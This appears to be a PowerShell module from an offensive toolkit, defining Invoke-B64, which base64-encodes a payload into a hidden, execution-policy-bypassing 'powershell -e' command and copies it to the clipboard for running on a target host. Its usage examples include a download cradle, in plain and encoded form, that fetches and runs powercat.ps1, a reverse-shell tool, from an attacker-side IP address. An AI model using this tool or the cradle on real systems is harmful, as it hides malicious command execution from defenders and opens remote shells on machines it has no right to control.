function Invoke-B64
{
<#
.SYNOPSIS
    Returns a base64-(encoded|decoded) string of the provided payload of choice

.DESCRIPTION
    This function converts a plaintext payload provided by the user
    to a base64-encoded string to be executed by the target host
    Function also supports decoding a string by passing the -d switch

.PARAMETER payload
    Payload to be encoded

.PARAMETER decode
    Decodes the given base64-encoded payload

.INPUTS
    String

.OUTPUTS
    String

.EXAMPLE
    Invoke-B64 -p "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.20.10:80/powercat.ps1')"

.EXAMPLE
    ib64 -d SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgAyADAALgAxADAAOgA4ADAALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA
#>

  param (
    [Parameter(Mandatory = $true)]
    [Alias("p")]
    [String]$payload,

    [Parameter(Mandatory = $false)]
    [Alias("i")]
    [Switch]$internal,

    [Parameter(Mandatory = $false)]
    [Alias("d")]
    [Switch]$decode = $false
  )

  $cmd = "powershell -nop -ep unrestricted -w hidden -e"
  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
  Set-Clipboard -Value ($cmd + ' ' + $enc)

  if( $decode ) {
    $dec = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
    Write-Output ""
    Write-Host "[+] Decoded payload:" -ForegroundColor Green
    Write-Host "--------------------" -ForegroundColor Green
    Write-Host $dec -ForegroundColor green
    Write-Output ""
    }
  else {
    if ( $internal ) {
        return $enc
      }
    else {
      Write-Output ""
      Write-Host "[+] Encoded payload (copied to clipboard):" -ForegroundColor Green
      Write-Host "------------------------------------------" -ForegroundColor Green
      Write-Host $cmd $enc -ForegroundColor green
      Write-Output ""
      }
  }
}

Set-Alias -Name ib64 -Value Invoke-B64
Export-ModuleMember -Function Invoke-B64 -Alias ib64
